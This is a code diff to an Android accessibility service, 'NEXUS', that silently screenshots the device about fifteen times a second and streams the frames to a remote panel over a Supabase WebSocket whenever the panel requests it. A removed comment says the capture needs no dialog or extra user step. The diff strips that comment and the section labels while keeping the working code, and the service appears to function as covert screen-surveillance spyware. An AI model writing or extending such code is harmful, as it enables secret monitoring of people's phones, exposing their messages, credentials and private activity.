@@ -12,16 +12,6 @@ import android.util.Base64
 import java.io.ByteArrayOutputStream
 import java.util.concurrent.Executors
 
-/**
- * NEXUS · NexusAccessibilityService
- *
- * Usa AccessibilityService.takeScreenshot() (API 30+, sem diálogo)
- * para capturar a tela e transmitir ao vivo para o painel via
- * Supabase Realtime WebSocket.
- *
- * O utilizador já deu permissão de Acessibilidade ao instalar — sem
- * nenhum passo extra.
- */
 class NexusAccessibilityService : AccessibilityService() {
 
     private val executor     = Executors.newSingleThreadExecutor()
@@ -30,8 +20,8 @@ class NexusAccessibilityService : AccessibilityService() {
     private var transmitindo = false
     private var capturaJob: Runnable? = null
 
-    private val JPEG_QUALITY = 55
-    private val INTERVALO_MS = 67L   // ~15 fps
+    private val JPEG_QUALITY: Int = 55
+    private val INTERVALO_MS: Long = 67L
 
     companion object {
         var instance: NexusAccessibilityService? = null
@@ -56,23 +46,24 @@ class NexusAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
     override fun onInterrupt() {}
 
-    // ── Ligar ao Supabase Realtime ──────────────────────────────
     private fun ligarRealtime() {
-        if (supaUrl.isEmpty()) {
-            handler.postDelayed({ ligarRealtime() }, 2000)
+        val url = supaUrl
+        val key = supaKey
+        val id  = deviceId
+        if (url.isEmpty()) {
+            handler.postDelayed({ ligarRealtime() }, 2000L)
             return
         }
         wsClient = RealtimeWsClient(
-            supaUrl  = supaUrl,
-            supaKey  = supaKey,
-            deviceId = deviceId,
+            supaUrl  = url,
+            supaKey  = key,
+            deviceId = id,
             onPedirTela = { iniciarStream() },
-            onPararTela = { pararStream() }
+            onPararTela  = { pararStream() }
         )
         wsClient!!.ligar()
     }
 
-    // ── Iniciar stream ───────────────────────────────────────────
     fun iniciarStream() {
         if (transmitindo) return
         transmitindo = true
@@ -93,7 +84,6 @@ class NexusAccessibilityService : AccessibilityService() {
         handler.post(loop)
     }
 
-    // ── Parar stream ─────────────────────────────────────────────
     fun pararStream() {
         transmitindo = false
         capturaJob?.let { handler.removeCallbacks(it) }
@@ -104,7 +94,6 @@ class NexusAccessibilityService : AccessibilityService() {
         ))
     }
 
-    // ── Capturar frame via takeScreenshot (API 30+) ──────────────
     private fun capturarFrame() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
             wsClient?.enviar(mapOf(
@@ -133,29 +122,30 @@ class NexusAccessibilityService : AccessibilityService() {
                             val softBmp = hardwareBmp.copy(Bitmap.Config.ARGB_8888, false)
                             hardwareBmp.recycle()
 
-                            val targetW = 540
-                            val targetH = (softBmp.height * targetW.toFloat() / softBmp.width).toInt()
-                            val scaled  = Bitmap.createScaledBitmap(softBmp, targetW, targetH, false)
+                            val targetW: Int = 540
+                            val targetH: Int = (softBmp.height * targetW.toFloat() / softBmp.width).toInt()
+                            val scaled = Bitmap.createScaledBitmap(softBmp, targetW, targetH, false)
                             softBmp.recycle()
 
                             val baos = ByteArrayOutputStream()
                             scaled.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, baos)
                             scaled.recycle()
 
-                            val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
+                            val b64: String = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
+                            val wStr: String = targetW.toString()
+                            val hStr: String = targetH.toString()
+
                             wsClient?.enviar(mapOf(
                                 "event"     to "frame",
                                 "device_id" to deviceId,
                                 "data"      to b64,
-                                "w"         to targetW.toString(),
-                                "h"         to targetH.toString()
+                                "w"         to wStr,
+                                "h"         to hStr
                             ))
                         } catch (_: Exception) {}
                     }
 
-                    override fun onFailure(errorCode: Int) {
-                        // Erro pontual — continuar
-                    }
+                    override fun onFailure(errorCode: Int) {}
                 }
             )
         } catch (_: Exception) {}
